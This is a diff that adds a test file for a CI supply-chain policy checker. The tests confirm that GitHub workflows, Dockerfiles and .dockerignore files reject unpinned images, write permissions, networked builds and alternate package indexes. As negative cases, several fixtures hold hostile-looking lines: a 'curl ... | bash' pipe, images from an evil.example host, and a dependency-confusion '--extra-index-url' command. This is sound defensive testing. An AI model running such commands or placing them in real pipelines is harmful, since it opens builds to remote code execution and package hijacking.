@@ -1,0 +1,315 @@
+import { readFileSync } from 'node:fs';
+import { dump as dumpYaml, load as parseYaml } from 'js-yaml';
+import { describe, expect, it } from 'vitest';
+import {
+  ATOMISTIC_BOOTSTRAP_BASE_AMD64_DIGEST,
+  ATOMISTIC_BOOTSTRAP_BASE_IMAGE,
+  ATOMISTIC_BOOTSTRAP_NODE_VERSION,
+  ATOMISTIC_BOOTSTRAP_PYPI_INDEX,
+  ATOMISTIC_BOOTSTRAP_PYTORCH_INDEX,
+  ATOMISTIC_BOOTSTRAP_WORKFLOW_PATH,
+  DOCKERIGNORE_ALLOWLIST,
+  inspectDockerfileSource,
+  inspectDockerignoreSource,
+  inspectWorkflowSource,
+  PINNED_DOCKERFILE_FRONTEND,
+  SENTINEL_EVALUATION_WORKFLOW_PATH,
+  SENTINEL_REPORT_WORKFLOW_PATH,
+} from './workflow-policy.mjs';
+
+const atomisticBootstrapSource = readFileSync(
+  new URL('../.github/workflows/atomistic-bootstrap.yml', import.meta.url),
+  'utf8',
+);
+const checkedInDockerignoreSource = readFileSync(
+  new URL('../.dockerignore', import.meta.url),
+  'utf8',
+);
+const sentinelEvaluationSource = readFileSync(
+  new URL('../.github/workflows/evaluate.yml', import.meta.url),
+  'utf8',
+);
+const sentinelReportSource = readFileSync(
+  new URL('../.github/workflows/sentinel-report.yml', import.meta.url),
+  'utf8',
+);
+const sentinelEvaluationWorkflow = parseYaml(sentinelEvaluationSource);
+const sentinelReportWorkflow = parseYaml(sentinelReportSource);
+
+function inspectMutatedBootstrap(mutator) {
+  const workflow = parseYaml(atomisticBootstrapSource);
+  mutator(workflow);
+  return inspectWorkflowSource(
+    ATOMISTIC_BOOTSTRAP_WORKFLOW_PATH,
+    dumpYaml(workflow, { lineWidth: -1, noRefs: true }),
+  );
+}
+
+function namedStep(workflow, name) {
+  const matches = workflow.jobs.bootstrap.steps.filter((step) => step.name === name);
+  if (matches.length !== 1) throw new Error(`expected one bootstrap step named ${name}`);
+  return matches[0];
+}
+
+describe('workflow source policy', () => {
+  it('accepts full action and OCI pins plus credential-free checkout', () => {
+    const source = `on: [push]\njobs:\n  test:\n    container: node@sha256:${'b'.repeat(64)}\n    services:\n      db:\n        image: postgres@sha256:${'c'.repeat(64)}\n    steps:\n      - uses: actions/checkout@${'a'.repeat(40)} # v4\n        with:\n          persist-credentials: false\n      - uses: docker://example/tool@sha256:${'d'.repeat(64)}\n      - uses: ./local-action\n`;
+    expect(inspectWorkflowSource('safe.yml', source)).toEqual([]);
+  });
+
+  it('rejects mutable refs, images, pull_request_target, credentials and network-to-shell', () => {
+    const failures = inspectWorkflowSource('unsafe.yml', `on:\n  pull_request_target:\njobs:\n  x:\n    container: ubuntu:latest\n    services:\n      db:\n        image: postgres:latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: docker://evil.example/tool:latest\n      - run: curl https://example.invalid/x | bash\n`);
+    expect(failures).toHaveLength(7);
+    expect(failures.join('\n')).toMatch(/Docker action.*not pinned/);
+  });
+
+  it('rejects duplicate YAML keys instead of accepting last-wins parsing', () => {
+    expect(inspectWorkflowSource('duplicate.yml', 'on: push\non: pull_request\njobs: {}').join('\n')).toMatch(/duplicate keys/);
+  });
+
+  it('keeps candidate evaluation read-only and moves PR writes to the default-branch workflow_run reporter', () => {
+    expect(inspectWorkflowSource(SENTINEL_EVALUATION_WORKFLOW_PATH, sentinelEvaluationSource)).toEqual([]);
+    expect(inspectWorkflowSource(SENTINEL_REPORT_WORKFLOW_PATH, sentinelReportSource)).toEqual([]);
+    expect(sentinelEvaluationWorkflow.permissions).toEqual({ contents: 'read' });
+    expect(Object.keys(sentinelEvaluationWorkflow.jobs)).toEqual(['evaluate']);
+    expect(sentinelEvaluationWorkflow.jobs.evaluate.permissions).toEqual({ contents: 'read' });
+    expect(sentinelEvaluationWorkflow.jobs.evaluate['runs-on']).toBe('ubuntu-24.04');
+    expect(sentinelReportWorkflow.on).toEqual({
+      workflow_run: {
+        workflows: ['Tailing Sentinel'],
+        types: ['completed'],
+      },
+    });
+    expect(sentinelReportWorkflow.permissions).toEqual({
+      actions: 'read',
+      'pull-requests': 'write',
+    });
+    expect(sentinelReportWorkflow.jobs.report.permissions).toEqual({
+      actions: 'read',
+      'pull-requests': 'write',
+    });
+    expect(sentinelReportWorkflow.jobs.report['runs-on']).toBe('ubuntu-24.04');
+    expect(sentinelReportWorkflow.jobs.report.steps.some((step) => step.run
+      || String(step.uses ?? '').startsWith('actions/checkout@')
+      || String(step.uses ?? '').startsWith('./'))).toBe(false);
+    expect(sentinelReportWorkflow.jobs.report.steps.every((step) =>
+      /^actions\/github-script@[0-9a-f]{40}$/.test(step.uses))).toBe(true);
+    for (const stepId of ['build', 'report_build']) {
+      const buildStep = sentinelEvaluationWorkflow.jobs.evaluate.steps.find((step) => step.id === stepId);
+      expect(buildStep?.env).toEqual({
+        NEXT_PUBLIC_TAILING_COMMIT_SHA: '${{ github.sha }}',
+      });
+    }
+  });
+
+  it('rejects every candidate-workflow attempt to acquire write authority', () => {
+    const cases = [
+      ['top-level pull-request write', (workflow) => { workflow.permissions['pull-requests'] = 'write'; }],
+      ['evaluate-job pull-request write', (workflow) => { workflow.jobs.evaluate.permissions['pull-requests'] = 'write'; }],
+      ['OIDC write', (workflow) => { workflow.jobs.evaluate.permissions['id-token'] = 'write'; }],
+      ['privileged sibling job', (workflow) => {
+        workflow.jobs.report = {
+          permissions: { 'pull-requests': 'write' },
+          'runs-on': 'ubuntu-24.04',
+          steps: [],
+        };
+      }],
+      ['target-context trigger', (workflow) => { workflow.on = { pull_request_target: null }; }],
+    ];
+    for (const [label, mutate] of cases) {
+      const workflow = parseYaml(sentinelEvaluationSource);
+      mutate(workflow);
+      expect(inspectWorkflowSource(
+        SENTINEL_EVALUATION_WORKFLOW_PATH,
+        dumpYaml(workflow, { lineWidth: -1, noRefs: true }),
+      ), label).not.toEqual([]);
+    }
+  });
+
+  it('rejects reporter trust-binding, bounded-data, and no-candidate-execution drift', () => {
+    const cases = [
+      ['source workflow name', (workflow) => { workflow.on.workflow_run.workflows = ['Candidate Sentinel']; }],
+      ['write scope expansion', (workflow) => { workflow.permissions.contents = 'write'; }],
+      ['mutable runner', (workflow) => { workflow.jobs.report['runs-on'] = 'ubuntu-latest'; }],
+      ['candidate checkout', (workflow) => {
+        workflow.jobs.report.steps.splice(1, 0, {
+          name: 'Checkout candidate',
+          uses: `actions/checkout@${'a'.repeat(40)}`,
+          with: { ref: '${{ github.event.workflow_run.head_sha }}', 'persist-credentials': false },
+        });
+      }],
+      ['candidate shell', (workflow) => {
+        workflow.jobs.report.steps.push({ name: 'Run candidate', run: 'node candidate.mjs' });
+      }],
+      ['workflow id drift', (workflow) => {
+        workflow.jobs.report.steps[0].env.EXPECTED_WORKFLOW_ID = '1';
+      }],
+      ['repository id drift', (workflow) => {
+        workflow.jobs.report.steps[0].env.EXPECTED_REPOSITORY_ID = '1';
+      }],
+      ['artifact size expansion', (workflow) => {
+        workflow.jobs.report.steps[1].env.MAX_ARTIFACT_ARCHIVE_BYTES = '1073741824';
+      }],
+      ['report size expansion', (workflow) => {
+        workflow.jobs.report.steps[1].env.MAX_REPORT_BYTES = '1073741824';
+      }],
+      ['artifact-name validation removal', (workflow) => {
+        workflow.jobs.report.steps[0].with.script = workflow.jobs.report.steps[0].with.script
+          .replace("assert(matches.length === 1, 'expected report artifact name must resolve exactly once');", '');
+      }],
+      ['mention neutralization removal', (workflow) => {
+        workflow.jobs.report.steps[1].with.script = workflow.jobs.report.steps[1].with.script
+          .replace(".replaceAll('@', '@\\u200b');", ".replaceAll('@', '@');");
+      }],
+      ['ZIP expansion guard removal', (workflow) => {
+        workflow.jobs.report.steps[1].with.script = workflow.jobs.report.steps[1].with.script
+          .replace('expandedSize > 0 && expandedSize <= maxReportBytes', 'expandedSize > 0');
+      }],
+    ];
+    for (const [label, mutate] of cases) {
+      const workflow = parseYaml(sentinelReportSource);
+      mutate(workflow);
+      expect(inspectWorkflowSource(
+        SENTINEL_REPORT_WORKFLOW_PATH,
+        dumpYaml(workflow, { lineWidth: -1, noRefs: true }),
+      ), label).not.toEqual([]);
+    }
+  });
+
+  it('compiles both reviewed reporter programs as asynchronous JavaScript', () => {
+    const AsyncFunction = Object.getPrototypeOf(async function noop() {}).constructor;
+    for (const step of sentinelReportWorkflow.jobs.report.steps) {
+      expect(() => new AsyncFunction('github', 'context', 'core', 'require', step.with.script)).not.toThrow();
+    }
+  });
+});
+
+describe('Dockerfile source policy', () => {
+  it('accepts the pinned frontend, required base argument and named wheelhouse context', () => {
+    const source = `# syntax=${PINNED_DOCKERFILE_FRONTEND}\nARG BASE_IMAGE\nFROM \${BASE_IMAGE} AS builder\nCOPY --from=wheelhouse / /wheelhouse/\nFROM \${BASE_IMAGE} AS runtime\nCOPY --from=builder /opt/venv /opt/venv\n`;
+    expect(inspectDockerfileSource('safe.Dockerfile', source)).toEqual([]);
+  });
+
+  it('rejects a mutable frontend, default base, external COPY, networked RUN, secrets and remote ADD', () => {
+    const source = '# syntax=docker/dockerfile:1.7\nARG BASE_IMAGE=python:latest\nFROM python:latest AS runtime\nCOPY --from=evil:latest /x /x\nRUN --mount=type=secret pip check\nADD https://example.invalid/x /x\n';
+    expect(inspectDockerfileSource('unsafe.Dockerfile', source)).toHaveLength(7);
+  });
+});
+
+describe('Docker build-context policy', () => {
+  it('accepts only the exact deny-all atomistic allowlist', () => {
+    const safe = `${DOCKERIGNORE_ALLOWLIST.join('\n')}\n`;
+    expect(checkedInDockerignoreSource).toBe(safe);
+    expect(inspectDockerignoreSource('.dockerignore', checkedInDockerignoreSource)).toEqual([]);
+    expect(inspectDockerignoreSource('.dockerignore', safe)).toEqual([]);
+    expect(inspectDockerignoreSource('.dockerignore', `${safe}!.env\n`).join('\n')).toMatch(/exact deny-all allowlist/);
+    expect(inspectDockerignoreSource('.dockerignore', safe.replace('**\n', '')).join('\n')).toMatch(/exact deny-all allowlist/);
+  });
+});
+
+describe('atomistic bootstrap supply-chain policy', () => {
+  it('accepts the checked-in manual dual-model non-promotional workflow', () => {
+    expect(inspectWorkflowSource(ATOMISTIC_BOOTSTRAP_WORKFLOW_PATH, atomisticBootstrapSource)).toEqual([]);
+    expect(ATOMISTIC_BOOTSTRAP_NODE_VERSION).toBe('24.16.0');
+    expect(ATOMISTIC_BOOTSTRAP_BASE_IMAGE).toMatch(/^python:3\.12\.13-slim-bookworm@sha256:[0-9a-f]{64}$/);
+    expect(ATOMISTIC_BOOTSTRAP_BASE_AMD64_DIGEST).toMatch(/^sha256:[0-9a-f]{64}$/);
+  });
+
+  it('rejects trigger, main guard, runtime, architecture and model-isolation drift', () => {
+    const cases = [
+      ['push trigger', (workflow) => { workflow.on = { push: null }; }],
+      ['workflow input override', (workflow) => { workflow.on.workflow_dispatch = { inputs: { plan: { required: false } } }; }],
+      ['non-main guard', (workflow) => {
+        const step = namedStep(workflow, 'Refuse non-main, non-Linux, or non-x86_64 dispatches');
+        step.run = step.run.replace('refs/heads/main', 'refs/heads/review');
+      }],
+      ['mutable Node runtime', (workflow) => {
+        namedStep(workflow, 'Install the pinned JavaScript runtime').with['node-version'] = '24';
+      }],
+      ['base image drift', (workflow) => { workflow.env.BASE_IMAGE = `python:3.12.13@sha256:${'1'.repeat(64)}`; }],
+      ['base platform digest drift', (workflow) => { workflow.env.BASE_IMAGE_AMD64_DIGEST = `sha256:${'2'.repeat(64)}`; }],
+      ['frontend drift', (workflow) => { workflow.env.DOCKERFILE_FRONTEND = `docker/dockerfile:1.7@sha256:${'3'.repeat(64)}`; }],
+      ['runner OS drift', (workflow) => { workflow.jobs.bootstrap['runs-on'] = 'macos-14'; }],
+      ['joint model execution', (workflow) => { workflow.jobs.bootstrap.strategy.matrix.model = ['mattersim-and-mace']; }],
+      ['publish root drift', (workflow) => { workflow.jobs.bootstrap.env.PUBLISH_DIR = '${{ env.UNSET }}/'; }],
+      ['unreviewed job key', (workflow) => { workflow.jobs.bootstrap.container = ATOMISTIC_BOOTSTRAP_BASE_IMAGE; }],
+    ];
+    for (const [label, mutate] of cases) {
+      expect(inspectMutatedBootstrap(mutate), label).not.toEqual([]);
+    }
+  });
+
+  it('rejects alternate package sources and any networked resolve, cold-install, build or checkpoint run', () => {
+    const cases = [
+      ['alternate PyTorch source', (workflow) => {
+        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
+        step.run = step.run.replace(ATOMISTIC_BOOTSTRAP_PYTORCH_INDEX, 'https://pypi.example.invalid/simple');
+      }],
+      ['alternate remaining-dependency source', (workflow) => {
+        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
+        step.run = step.run.replace(ATOMISTIC_BOOTSTRAP_PYPI_INDEX, 'https://mirror.example.invalid/simple');
+      }],
+      ['dependency-confusion extra index', (workflow) => {
+        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
+        step.run += '\npython -m pip download --extra-index-url https://evil.example.invalid/simple torch\n';
+      }],
+      ['networked lock resolution', (workflow) => {
+        const step = namedStep(workflow, 'Resolve an exact lock from the offline wheelhouse');
+        step.run = step.run.replace('--network=none', '--network=bridge');
+      }],
+      ['networked cold install', (workflow) => {
+        const step = namedStep(workflow, 'Prove a cold, hash-locked install with no network');
+        step.run = step.run.replace('--network=none', '--network=bridge');
+      }],
+      ['networked image build', (workflow) => {
+        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
+        step.run = step.run.replace('--network=none', '--network=default');
+      }],
+      ['networked checkpoint run', (workflow) => {
+        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
+        step.run = step.run.replace('--network=none', '--network=bridge');
+      }],
+      ['non-amd64 checkpoint run', (workflow) => {
+        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
+        step.run = step.run.replace('--platform=linux/amd64', '--platform=linux/arm64');
+      }],
+    ];
+    for (const [label, mutate] of cases) {
+      expect(inspectMutatedBootstrap(mutate), label).not.toEqual([]);
+    }
+  });
+
+  it('rejects broader artifacts, full runs, metrics, receipts and attestations', () => {
+    const cases = [
+      ['promotional artifact name', (workflow) => {
+        namedStep(workflow, 'Upload the allowlisted bootstrap bundle').with.name = 'tailing-atomistic-full-${{ github.sha }}';
+      }],
+      ['whole-workspace upload', (workflow) => {
+        namedStep(workflow, 'Upload the allowlisted bootstrap bundle').with.path = '${{ github.workspace }}/';
+      }],
+      ['unguarded upload after failed staging', (workflow) => {
+        namedStep(workflow, 'Upload the allowlisted bootstrap bundle').if = 'always()';
+      }],
+      ['full checkpoint run', (workflow) => {
+        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
+        step.run = step.run.replace('--mode smoke', '--mode full');
+      }],
+      ['checkpoint publication', (workflow) => {
+        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
+        step.run += '\ninstall -m 0444 "$CACHE_ROOT/$CHECKPOINT_CACHE_PATH" "$PUBLISH_DIR/checkpoint.model"\n';
+      }],
+      ['metrics side step', (workflow) => {
+        workflow.jobs.bootstrap.steps.splice(-1, 0, { name: 'Compute metrics', shell: 'bash', run: 'node compute-metrics.mjs' });
+      }],
+      ['receipt side step', (workflow) => {
+        workflow.jobs.bootstrap.steps.splice(-1, 0, { name: 'Create receipt', shell: 'bash', run: 'node create-receipt.mjs' });
+      }],
+      ['attestation side step', (workflow) => {
+        workflow.jobs.bootstrap.steps.splice(-1, 0, { name: 'Attest', uses: `actions/attest-build-provenance@${'a'.repeat(40)}` });
+      }],
+    ];
+    for (const [label, mutate] of cases) {
+      expect(inspectMutatedBootstrap(mutate), label).not.toEqual([]);
+    }
+  });
+});
